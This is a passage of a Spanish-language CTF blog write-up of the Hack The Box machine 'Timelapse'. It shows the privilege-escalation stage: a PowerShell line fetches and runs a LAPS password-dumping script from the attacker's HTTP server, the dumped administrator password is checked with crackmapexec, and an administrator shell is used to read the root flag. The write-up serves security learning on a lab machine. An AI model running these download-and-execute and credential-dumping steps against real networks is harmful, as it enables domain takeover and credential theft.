+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_deploy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>timelapse<span class="se">\s</span>vc_deploy
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_deploy<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios-and-shell-as-administrator">Escalada de privilegios and Shell as administrator</h2>
+
+<ul>
+  <li>Como formamos parte del grupo <code class="language-plaintext highlighter-rouge">LAPS_Readers</code> vamos a usar este recurso <a href="https://github.com/kfosaaen/Get-LAPSPasswords">https://github.com/kfosaaen/Get-LAPSPasswords</a> para ver si podemos dumpear todas las contraseñas almacenadas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
+<span class="nt">--2023-07-26</span> 13:59:10--  https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.108.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 7419 <span class="o">(</span>7.2K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «Get-LAPSPasswords.ps1»
+
+Get-LAPSPasswords.ps1           100%[<span class="o">=======================================================&gt;]</span>   7.25K  <span class="nt">--</span>.-KB/s    en 0s      
+
+2023-07-26 13:59:10 <span class="o">(</span>34.4 MB/s<span class="o">)</span> - «Get-LAPSPasswords.ps1» guardado <span class="o">[</span>7419/7419]
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ejecutamos un servidor <strong>http</strong> con <strong>Python3</strong> para poder traernos el <strong>script</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo descargamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_deploy<span class="se">\D</span>ocuments&gt; IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.8:8080/Get-LAPSPass
+words.ps1'</span><span class="o">)</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_deploy<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+10.129.141.32 - - <span class="o">[</span>26/Jul/2023 14:02:29] <span class="s2">"GET /Get-LAPSPasswords.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora dumpeamos todas las credenciales.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_deploy<span class="se">\D</span>ocuments&gt; Get-LAPSPasswords
+
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09<span class="o">{</span>z4]5BiSl,e<span class="nv">$1d9</span><span class="o">!</span>+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09<span class="o">{</span>z4]5BiSl,e<span class="nv">$1d9</span><span class="o">!</span>+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09<span class="o">{</span>z4]5BiSl,e<span class="nv">$1d9</span><span class="o">!</span>+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   : dc01.timelapse.htb
+Stored     : 1
+Readable   : 1
+Password   : 09<span class="o">{</span>z4]5BiSl,e<span class="nv">$1d9</span><span class="o">!</span>+t8GT#
+Expiration : 7/31/2023 7:01:37 PM
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+Hostname   :
+Stored     : 0
+Readable   : 0
+Password   :
+Expiration : NA
+
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_deploy<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a validar si una de las contraseñas es del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.141.32 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'09{z4]5BiSl,e$1d9!+t8GT#'</span>
+SMB         10.129.141.32   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:timelapse.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.141.32   445    DC01             <span class="o">[</span>+] timelapse.htb<span class="se">\A</span>dministrator:09<span class="o">{</span>z4]5BiSl,e<span class="nv">$1d9</span><span class="o">!</span>+t8GT# <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="roottxt">root.txt</h2>
+
+<ul>
+  <li>Ahora nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-S</span> <span class="nt">-i</span> 10.129.141.32 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'09{z4]5BiSl,e$1d9!+t8GT#'</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\U</span>sers
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">dir</span> <span class="nt">-recurse</span> root.txt
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\T</span>RX<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>        7/26/2023   7:01 PM             34 root.txt
+
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\T</span>RX<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+ce3a58c7d90fbfcf1a8f22fa31375e8d
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; 
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/03/30/timelapse.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
